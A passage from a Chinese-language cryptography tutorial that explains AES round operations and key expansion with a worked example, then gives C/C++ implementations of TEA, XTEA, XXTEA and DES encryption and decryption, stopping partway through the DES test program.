</p></li></ol><ul><li>行移位<br>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节<br>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节  </li><li>列混合<br>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：<br><img src="/2021/120547052/6.png" alt=" "><br>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：<br><img src="/2021/120547052/7.png" alt=" "><br>其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。<br>逆向列混合变换可由下图的矩阵乘法定义：<br><img src="/2021/120547052/8.png" alt=" "></li><li>轮密钥加<br>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0 S1 S2 S3 组成的32位字与W[4i]的异或运算；轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。  </li><li>密钥扩展<br>AES首先将初始密钥输入到一个44的状态矩阵中，如下图所示。<br><img src="/2021/120547052/9.png" alt=" "><br>这个44矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0 = ‘a’,K1 = ‘b’, K2 = ‘c’,K3 = ‘d’,W[0] = “abcd”。接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生：1.如果i不是4的倍数，那么第i列由如下等式确定：W[i]=W[i-4]⨁W[i-1]2.如果i是4的倍数，那么第i列由如下等式确定：W[i]=W[i-4]⨁T(W[i-1])其中，T是一个有点复杂的函数。函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, b3]变换成[b1,b2,b3,b0]。b.字节代换：对字循环的结果使用S盒进行字节代换。c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。轮常量Rcon[j]是一个字，其值见下表。<br><img src="/2021/120547052/10.png" alt=" ">  </li></ul><pre class="line-numbers language-none"><code class="language-none">下面举个例子：设初始的128位密钥为：3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD那么4个初始值为：W[0] &#x3D; 3C A1 0B 21W[1] &#x3D; 57 F0 19 16W[2] &#x3D; 90 2E 13 80W[3] &#x3D; AC C1 07 BD下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。由于4是4的倍数，所以：W[4] &#x3D; W[0] ⨁ T(W[3])T(W[3])的计算步骤如下：循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC;将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91;将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])&#x3D;79 C5 7A 91，故W[4] &#x3D; 3C A1 0B 21 ⨁ 79 C5 7A 91 &#x3D; 45 64 71 B0其余的3个子密钥段的计算如下：W[5] &#x3D; W[1] ⨁ W[4] &#x3D; 57 F0 19 16 ⨁ 45 64 71 B0 &#x3D; 12 94 68 A6W[6] &#x3D; W[2] ⨁ W[5] &#x3D;90 2E 13 80 ⨁ 12 94 68 A6 &#x3D; 82 BA 7B 26W[7] &#x3D; W[3] ⨁ W[6] &#x3D; AC C1 07 BD ⨁ 82 BA 7B 26 &#x3D; 2E 7B 7C 9B所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TEA加密算法"><a href="#TEA加密算法" class="headerlink" title="TEA加密算法"></a>TEA加密算法</h4><ol><li>原理<br>TEA（Tiny Encryption Algorithm）是一种分组加密算法，它的实现非常简单，通常只需要很精短的几行代码。TEA算法使用64位的明文分组和128位的密钥，它使用Feistel分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了。该算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」（也就是程序中的 0×9E3779B9）  </li><li>代码实现  </li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;void Encrypt(long* EntryData, long* Key)&#123;    &#x2F;&#x2F;分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组    unsigned long x &#x3D; EntryData[0];    unsigned long y &#x3D; EntryData[1];    unsigned long sum &#x3D; 0;    unsigned long delta &#x3D; 0x9E3779B9;    &#x2F;&#x2F;总共加密32轮    for (int i &#x3D; 0; i &lt; 32; i++)    &#123;        sum +&#x3D; delta;        x +&#x3D; ((y &lt;&lt; 4) + Key[0]) ^ (y + sum) ^ ((y &gt;&gt; 5) + Key[1]);        y +&#x3D; ((x &lt;&lt; 4) + Key[2]) ^ (x + sum) ^ ((x &gt;&gt; 5) + Key[3]);    &#125;    &#x2F;&#x2F;最后加密的结果重新写入到数组中    EntryData[0] &#x3D; x;    EntryData[1] &#x3D; y;&#125;void Decrypt(long* EntryData, long* Key)&#123;    &#x2F;&#x2F;分别加密数组中的前四个字节与后4个字节,4个字节为一组每次加密两组    unsigned long x &#x3D; EntryData[0];    unsigned long y &#x3D; EntryData[1];    unsigned long sum &#x3D; 0;    unsigned long delta &#x3D; 0x9E3779B9;    sum &#x3D; delta &lt;&lt; 5;   &#x2F;&#x2F;注意这里,sum &#x3D; 32轮之后的黄金分割值. 因为我们要反序解密.    &#x2F;&#x2F;总共加密32轮 那么反序也解密32轮    for (int i &#x3D; 0; i &lt; 32; i++)    &#123;        &#x2F;&#x2F; 先将y解开 然后参与运算在解x        y -&#x3D; ((x &lt;&lt; 4) + Key[2]) ^ (x + sum) ^ ((x &gt;&gt; 5) + Key[3]);        x -&#x3D; ((y &lt;&lt; 4) + Key[0]) ^ (y + sum) ^ ((y &gt;&gt; 5) + Key[1]);        sum -&#x3D; delta;    &#125;    &#x2F;&#x2F;最后加密的结果重新写入到数组中    EntryData[0] &#x3D; x;    EntryData[1] &#x3D; y;&#125;int main()&#123;    long Data[3] &#x3D; &#123; 0x44434241,0x48474645,0x0 &#125;;    printf(&quot;待加密的数值 &#x3D; %s\r\n&quot;, (char*)Data);    long key[4] &#x3D; &#123; 0x11223344,0x55667788,0x99AABBCC,0xDDEEFF11 &#125;;    &#x2F;&#x2F;Encrypt每次只是加密4字节数组中的两组(也就是每次加密8个字节) 如果你数据多.可以来个for循环来循环加密,但是Entrypt内部还有32次循环,所以速度上还是会有点影响.    Encrypt(Data, key);    printf(&quot;加密后的数值 &#x3D; %s\r\n&quot;, (char*)Data);    Decrypt(Data, key);    printf(&quot;解密后的数值 &#x3D; %s\r\n&quot;, (char*)Data);    system(&quot;pause&quot;);&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="XTEA机密算法"><a href="#XTEA机密算法" class="headerlink" title="XTEA机密算法"></a>XTEA机密算法</h4><ol><li>原理<br>与TEA加密算法类似，只是增加了更多的密钥表，移位和异或操作等等。  </li><li>代码实现  </li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;  #include &lt;stdint.h&gt;  void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;      unsigned int i;      uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, delta&#x3D;0x9E3779B9;      for (i&#x3D;0; i &lt; num_rounds; i++) &#123;          v0 +&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);          sum +&#x3D; delta;          v1 +&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);      &#125;      v[0]&#x3D;v0; v[1]&#x3D;v1;  &#125;  void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;      unsigned int i;      uint32_t v0&#x3D;v[0], v1&#x3D;v[1], delta&#x3D;0x9E3779B9, sum&#x3D;delta*num_rounds;      for (i&#x3D;0; i &lt; num_rounds; i++) &#123;          v1 -&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);          sum -&#x3D; delta;          v0 -&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);      &#125;      v[0]&#x3D;v0; v[1]&#x3D;v1;  &#125;  int main()  &#123;      uint32_t v[2]&#x3D;&#123;1,2&#125;;      uint32_t const k[4]&#x3D;&#123;2,2,3,4&#125;;      unsigned int r&#x3D;32;&#x2F;&#x2F;num_rounds建议取值为32      &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数      &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位      printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);      encipher(r, v, k);      printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);      decipher(r, v, k);      printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);      return 0;  &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="XXTEA加密算法"><a href="#XXTEA加密算法" class="headerlink" title="XXTEA加密算法"></a>XXTEA加密算法</h4><ol><li>原理<br><img src="/2021/120547052/13.png" alt=" ">  </li><li>代码实现  </li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;  #include &lt;stdint.h&gt;  #define DELTA 0x9e3779b9  #define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  void btea(uint32_t *v, int n, uint32_t const key[4])  &#123;      uint32_t y, z, sum;      unsigned p, rounds, e;      if (n &gt; 1)            &#x2F;* Coding Part *&#x2F;      &#123;          rounds &#x3D; 6 + 52&#x2F;n;          sum &#x3D; 0;          z &#x3D; v[n-1];          do          &#123;              sum +&#x3D; DELTA;              e &#x3D; (sum &gt;&gt; 2) &amp; 3;              for (p&#x3D;0; p&lt;n-1; p++)              &#123;                  y &#x3D; v[p+1];                  z &#x3D; v[p] +&#x3D; MX;              &#125;              y &#x3D; v[0];              z &#x3D; v[n-1] +&#x3D; MX;          &#125;          while (--rounds);      &#125;      else if (n &lt; -1)      &#x2F;* Decoding Part *&#x2F;      &#123;          n &#x3D; -n;          rounds &#x3D; 6 + 52&#x2F;n;          sum &#x3D; rounds*DELTA;          y &#x3D; v[0];          do          &#123;              e &#x3D; (sum &gt;&gt; 2) &amp; 3;              for (p&#x3D;n-1; p&gt;0; p--)              &#123;                  z &#x3D; v[p-1];                  y &#x3D; v[p] -&#x3D; MX;              &#125;              z &#x3D; v[n-1];              y &#x3D; v[0] -&#x3D; MX;              sum -&#x3D; DELTA;          &#125;          while (--rounds);      &#125;  &#125;  int main()  &#123;      uint32_t v[2]&#x3D; &#123;1,2&#125;;      uint32_t const k[4]&#x3D; &#123;2,2,3,4&#125;;      int n&#x3D; 2; &#x2F;&#x2F;n的绝对值表示v的长度，取正表示加密，取负表示解密      &#x2F;&#x2F; v为要加密的数据是两个32位无符号整数      &#x2F;&#x2F; k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位      printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);      btea(v, n, k);      printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);      btea(v, -n, k);      printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);      return 0;  &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DES加密算法"><a href="#DES加密算法" class="headerlink" title="DES加密算法"></a>DES加密算法</h4><ol><li>原理<br>利用一些简单的密码变换，如：代换、置换、加减等设计出一个圈函数f，并通过将他多次迭代的方法，产生的一个分组密码算法  </li><li>基本参数<br>分组长度：64bit<br>密钥长度：64bit<br>有效密钥长度：56bit(每8bit的最高位是校验码，检验错误)<br>迭代的圈数：16圈<br>圈密钥的长度：48bit  </li><li>加密完整的流程图<br><img src="/2021/120547052/36.png" alt=" ">  </li><li>解析  </li></ol><ul><li>初始置换IP和逆初始置换IP-1<br><img src="/2021/120547052/37.png" alt=" "><br>其中：初始置换中的数字序号代表的是最初给定的数字的序号，而逆初始置换中的数字是经过一系列操作之后现在得到的结果进行从开始进行从新排序之后的数字编号  </li><li>迭代16圈<br>前15圈的算法结构可以表示为：(Li,Ri)=(Ri-1,Li-1⊕f(Ri-1, Ki))<br>第16圈的算法结构可以表示为：(L16,R16)=(L15⊕f(R15,K16),R16)  </li><li>f函数解析  </li></ul><ol><li>f函数图解<br><img src="/2021/120547052/38.png" alt=" ">  </li><li>E盒扩展<br>目的：将输入的32bit数据扩展为48bit数据<br><img src="/2021/120547052/39.png" alt=" "><br>扩展方式解析：(1) 将输入的32比特每4比特为一组分为8块;<br>（2）分别将第m-1块的最右比特和第m+1块的最左比特添到第m块的左边和右边,形成输出的第k个6比特块  </li><li>S盒代换<br>目的：将输入的48bit数据压缩为32bit数据<br><img src="/2021/120547052/40.png" alt=" "><br>举例：<br><img src="/2021/120547052/41.png" alt=" ">  </li><li>P盒变换<br>目的：对S盒变换后的32比特数据的位置进行移动<br><img src="/2021/120547052/42.png" alt=" "><br>特点：（1）P盒的各输入块的4个比特都分配到不同的输出块之中<br>（2）P盒的各输出块的4个比特都来自不同的输入块<br>（3）P盒的第t输出块的4个比特都不来自第t输入块  </li></ol><ul><li>DES的圈密钥生成算法  </li></ul><ol><li>圈密钥生成算法图解<br><img src="/2021/120547052/43.png" alt=" ">  </li><li>置换选择1<br><img src="/2021/120547052/44.png" alt=" "><br>其中：将每8个bit的最高位的检验位去除，之后按照图表进行排序  </li><li>置换选择2<br><img src="/2021/120547052/45.png" alt=" "><br>其中：该序号时将进行操作之后的数据从新编号之后，按图表编号在取出数据  </li><li>移位情况<br><img src="/2021/120547052/46.png" alt=" ">  </li></ol><ul><li>解密情况<br>解密和加密的算法结构完全相同<br>密钥顺序相反  </li><li>加密解密算法  </li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;*************************************************************************    &gt; File Name: Des.cpp    &gt; Author: SongLee    &gt; E-mail: lisong.shine@qq.com    &gt; Created Time: 2014年06月01日 星期日 19时46分32秒    &gt; Personal Blog: http:&#x2F;&#x2F;songlee24.github.com************************************************************************&#x2F;#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;bitset&gt;#include &lt;string&gt;using namespace std;bitset&lt;64&gt; key;                &#x2F;&#x2F; 64位密钥bitset&lt;48&gt; subKey[16];         &#x2F;&#x2F; 存放16轮子密钥&#x2F;&#x2F; 初始置换表int IP[] &#x3D; &#123;58, 50, 42, 34, 26, 18, 10, 2,            60, 52, 44, 36, 28, 20, 12, 4,            62, 54, 46, 38, 30, 22, 14, 6,            64, 56, 48, 40, 32, 24, 16, 8,            57, 49, 41, 33, 25, 17, 9,  1,            59, 51, 43, 35, 27, 19, 11, 3,            61, 53, 45, 37, 29, 21, 13, 5,            63, 55, 47, 39, 31, 23, 15, 7&#125;;&#x2F;&#x2F; 结尾置换表int IP_1[] &#x3D; &#123;40, 8, 48, 16, 56, 24, 64, 32,            39, 7, 47, 15, 55, 23, 63, 31,            38, 6, 46, 14, 54, 22, 62, 30,            37, 5, 45, 13, 53, 21, 61, 29,            36, 4, 44, 12, 52, 20, 60, 28,            35, 3, 43, 11, 51, 19, 59, 27,            34, 2, 42, 10, 50, 18, 58, 26,            33, 1, 41,  9, 49, 17, 57, 25&#125;;&#x2F;*------------------下面是生成密钥所用表-----------------*&#x2F;&#x2F;&#x2F; 密钥置换表，将64位密钥变成56位int PC_1[] &#x3D; &#123;57, 49, 41, 33, 25, 17, 9,            1, 58, 50, 42, 34, 26, 18,            10,  2, 59, 51, 43, 35, 27,            19, 11,  3, 60, 52, 44, 36,            63, 55, 47, 39, 31, 23, 15,            7, 62, 54, 46, 38, 30, 22,            14,  6, 61, 53, 45, 37, 29,            21, 13,  5, 28, 20, 12,  4&#125;;&#x2F;&#x2F; 压缩置换，将56位密钥压缩成48位子密钥int PC_2[] &#x3D; &#123;14, 17, 11, 24,  1,  5,            3, 28, 15,  6, 21, 10,            23, 19, 12,  4, 26,  8,            16,  7, 27, 20, 13,  2,            41, 52, 31, 37, 47, 55,            30, 40, 51, 45, 33, 48,            44, 49, 39, 56, 34, 53,            46, 42, 50, 36, 29, 32&#125;;&#x2F;&#x2F; 每轮左移的位数int shiftBits[] &#x3D; &#123;1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1&#125;;&#x2F;*------------------下面是密码函数 f 所用表-----------------*&#x2F;&#x2F;&#x2F; 扩展置换表，将 32位 扩展至 48位int E[] &#x3D; &#123;32,  1,  2,  3,  4,  5,            4,  5,  6,  7,  8,  9,            8,  9, 10, 11, 12, 13,        12, 13, 14, 15, 16, 17,        16, 17, 18, 19, 20, 21,        20, 21, 22, 23, 24, 25,        24, 25, 26, 27, 28, 29,        28, 29, 30, 31, 32,  1&#125;;&#x2F;&#x2F; S盒，每个S盒是4x16的置换表，6位 -&gt; 4位int S_BOX[8][4][16] &#x3D; &#123;    &#123;        &#123;14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7&#125;,        &#123;0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8&#125;,        &#123;4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0&#125;,        &#123;15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13&#125;    &#125;,    &#123;        &#123;15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10&#125;,        &#123;3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5&#125;,        &#123;0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15&#125;,        &#123;13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9&#125;    &#125;,    &#123;        &#123;10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8&#125;,        &#123;13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1&#125;,        &#123;13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7&#125;,        &#123;1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12&#125;    &#125;,    &#123;        &#123;7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15&#125;,        &#123;13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9&#125;,        &#123;10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4&#125;,        &#123;3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14&#125;    &#125;,    &#123;        &#123;2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9&#125;,        &#123;14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6&#125;,        &#123;4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14&#125;,        &#123;11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3&#125;    &#125;,    &#123;        &#123;12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11&#125;,        &#123;10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8&#125;,        &#123;9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6&#125;,        &#123;4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13&#125;    &#125;,    &#123;        &#123;4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1&#125;,        &#123;13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6&#125;,        &#123;1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2&#125;,        &#123;6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12&#125;    &#125;,    &#123;        &#123;13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7&#125;,        &#123;1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2&#125;,        &#123;7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8&#125;,        &#123;2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11&#125;    &#125;&#125;;&#x2F;&#x2F; P置换，32位 -&gt; 32位int P[] &#x3D; &#123;16,  7, 20, 21,        29, 12, 28, 17,            1, 15, 23, 26,            5, 18, 31, 10,            2,  8, 24, 14,        32, 27,  3,  9,        19, 13, 30,  6,        22, 11,  4, 25 &#125;;&#x2F;**********************************************************************&#x2F;&#x2F;*                                                                    *&#x2F;&#x2F;*                            下面是DES算法实现                         *&#x2F;&#x2F;*                                                                    *&#x2F;&#x2F;**********************************************************************&#x2F;&#x2F;***  密码函数f，接收32位数据和48位子密钥，产生一个32位的输出*&#x2F;bitset&lt;32&gt; f(bitset&lt;32&gt; R, bitset&lt;48&gt; k)&#123;    bitset&lt;48&gt; expandR;    &#x2F;&#x2F; 第一步：扩展置换，32 -&gt; 48    for(int i&#x3D;0; i&lt;48; ++i)        expandR[47-i] &#x3D; R[32-E[i]];    &#x2F;&#x2F; 第二步：异或    expandR &#x3D; expandR ^ k;    &#x2F;&#x2F; 第三步：查找S_BOX置换表    bitset&lt;32&gt; output;    int x &#x3D; 0;    for(int i&#x3D;0; i&lt;48; i&#x3D;i+6)    &#123;        int row &#x3D; expandR[47-i]*2 + expandR[47-i-5];        int col &#x3D; expandR[47-i-1]*8 + expandR[47-i-2]*4 + expandR[47-i-3]*2 + expandR[47-i-4];        int num &#x3D; S_BOX[i&#x2F;6][row][col];        bitset&lt;4&gt; binary(num);        output[31-x] &#x3D; binary[3];        output[31-x-1] &#x3D; binary[2];        output[31-x-2] &#x3D; binary[1];        output[31-x-3] &#x3D; binary[0];        x +&#x3D; 4;    &#125;    &#x2F;&#x2F; 第四步：P-置换，32 -&gt; 32    bitset&lt;32&gt; tmp &#x3D; output;    for(int i&#x3D;0; i&lt;32; ++i)        output[31-i] &#x3D; tmp[32-P[i]];    return output;&#125;&#x2F;***  对56位密钥的前后部分进行左移*&#x2F;bitset&lt;28&gt; leftShift(bitset&lt;28&gt; k, int shift)&#123;    bitset&lt;28&gt; tmp &#x3D; k;    for(int i&#x3D;27; i&gt;&#x3D;0; --i)    &#123;        if(i-shift&lt;0)            k[i] &#x3D; tmp[i-shift+28];        else            k[i] &#x3D; tmp[i-shift];    &#125;    return k;&#125;&#x2F;***  生成16个48位的子密钥*&#x2F;void generateKeys()&#123;    bitset&lt;56&gt; realKey;    bitset&lt;28&gt; left;    bitset&lt;28&gt; right;    bitset&lt;48&gt; compressKey;    &#x2F;&#x2F; 去掉奇偶标记位，将64位密钥变成56位    for (int i&#x3D;0; i&lt;56; ++i)        realKey[55-i] &#x3D; key[64 - PC_1[i]];    &#x2F;&#x2F; 生成子密钥，保存在 subKeys[16] 中    for(int round&#x3D;0; round&lt;16; ++round)    &#123;        &#x2F;&#x2F; 前28位与后28位        for(int i&#x3D;28; i&lt;56; ++i)            left[i-28] &#x3D; realKey[i];        for(int i&#x3D;0; i&lt;28; ++i)            right[i] &#x3D; realKey[i];        &#x2F;&#x2F; 左移        left &#x3D; leftShift(left, shiftBits[round]);        right &#x3D; leftShift(right, shiftBits[round]);        &#x2F;&#x2F; 压缩置换，由56位得到48位子密钥        for(int i&#x3D;28; i&lt;56; ++i)            realKey[i] &#x3D; left[i-28];        for(int i&#x3D;0; i&lt;28; ++i)            realKey[i] &#x3D; right[i];        for(int i&#x3D;0; i&lt;48; ++i)            compressKey[47-i] &#x3D; realKey[56 - PC_2[i]];        subKey[round] &#x3D; compressKey;    &#125;&#125;&#x2F;***  工具函数：将char字符数组转为二进制*&#x2F;bitset&lt;64&gt; charToBitset(const char s[8])&#123;    bitset&lt;64&gt; bits;    for(int i&#x3D;0; i&lt;8; ++i)        for(int j&#x3D;0; j&lt;8; ++j)            bits[i*8+j] &#x3D; ((s[i]&gt;&gt;j) &amp; 1);    return bits;&#125;&#x2F;***  DES加密*&#x2F;bitset&lt;64&gt; encrypt(bitset&lt;64&gt;&amp; plain)&#123;    bitset&lt;64&gt; cipher;    bitset&lt;64&gt; currentBits;    bitset&lt;32&gt; left;    bitset&lt;32&gt; right;    bitset&lt;32&gt; newLeft;    &#x2F;&#x2F; 第一步：初始置换IP    for(int i&#x3D;0; i&lt;64; ++i)        currentBits[63-i] &#x3D; plain[64-IP[i]];    &#x2F;&#x2F; 第二步：获取 Li 和 Ri    for(int i&#x3D;32; i&lt;64; ++i)        left[i-32] &#x3D; currentBits[i];    for(int i&#x3D;0; i&lt;32; ++i)        right[i] &#x3D; currentBits[i];    &#x2F;&#x2F; 第三步：共16轮迭代    for(int round&#x3D;0; round&lt;16; ++round)    &#123;        newLeft &#x3D; right;        right &#x3D; left ^ f(right,subKey[round]);        left &#x3D; newLeft;    &#125;    &#x2F;&#x2F; 第四步：合并L16和R16，注意合并为 R16L16    for(int i&#x3D;0; i&lt;32; ++i)        cipher[i] &#x3D; left[i];    for(int i&#x3D;32; i&lt;64; ++i)        cipher[i] &#x3D; right[i-32];    &#x2F;&#x2F; 第五步：结尾置换IP-1    currentBits &#x3D; cipher;    for(int i&#x3D;0; i&lt;64; ++i)        cipher[63-i] &#x3D; currentBits[64-IP_1[i]];    &#x2F;&#x2F; 返回密文    return cipher;&#125;&#x2F;***  DES解密*&#x2F;bitset&lt;64&gt; decrypt(bitset&lt;64&gt;&amp; cipher)&#123;    bitset&lt;64&gt; plain;    bitset&lt;64&gt; currentBits;    bitset&lt;32&gt; left;    bitset&lt;32&gt; right;    bitset&lt;32&gt; newLeft;    &#x2F;&#x2F; 第一步：初始置换IP    for(int i&#x3D;0; i&lt;64; ++i)        currentBits[63-i] &#x3D; cipher[64-IP[i]];    &#x2F;&#x2F; 第二步：获取 Li 和 Ri    for(int i&#x3D;32; i&lt;64; ++i)        left[i-32] &#x3D; currentBits[i];    for(int i&#x3D;0; i&lt;32; ++i)        right[i] &#x3D; currentBits[i];    &#x2F;&#x2F; 第三步：共16轮迭代（子密钥逆序应用）    for(int round&#x3D;0; round&lt;16; ++round)    &#123;        newLeft &#x3D; right;        right &#x3D; left ^ f(right,subKey[15-round]);        left &#x3D; newLeft;    &#125;    &#x2F;&#x2F; 第四步：合并L16和R16，注意合并为 R16L16    for(int i&#x3D;0; i&lt;32; ++i)        plain[i] &#x3D; left[i];    for(int i&#x3D;32; i&lt;64; ++i)        plain[i] &#x3D; right[i-32];    &#x2F;&#x2F; 第五步：结尾置换IP-1    currentBits &#x3D; plain;    for(int i&#x3D;0; i&lt;64; ++i)        plain[63-i] &#x3D; currentBits[64-IP_1[i]];    &#x2F;&#x2F; 返回明文    return plain;&#125;&#x2F;**********************************************************************&#x2F;&#x2F;* 测试：                                                             *&#x2F;&#x2F;*     1.将一个 64 位的字符串加密， 把密文写入文件 a.txt                  *&#x2F;&#x2F;*     2.读取文件 a.txt 获得 64 位密文，解密之后再写入 b.txt              *&#x2F;&#x2F;**********************************************************************&#x2F;int main() &#123;    string s &#x3D; &quot;romantic&quot;;    string k &#x3D; &quot;12345678&quot;;    bitset&lt;64&gt; plain &#x3D; charToBitset(s.c_str());    key &#x3D; charToBitset(k.c_str());    &#x2F;&#x2F; 生成16个子密钥    generateKeys();    &#x2F;&#x2F; 密文写入 a.txt    bitset&lt;64&gt; cipher &#x3D; encrypt(plain);    fstream file1;    file1.open(&quot;D:&#x2F;&#x2F;a.txt&quot;, ios::binary | ios::out);    file1.write((char*)&amp;cipher,sizeof(cipher));    file1.close();    &#x2F;&#x2F; 读文件 a.txt    bitset&lt;64&gt; temp;    file1.open(&quot;D:&#x2F;&#x2F;a.txt&quot;, ios::binary | ios::in);    file1.read((char*)&amp;temp, sizeof(temp));    file1.close();    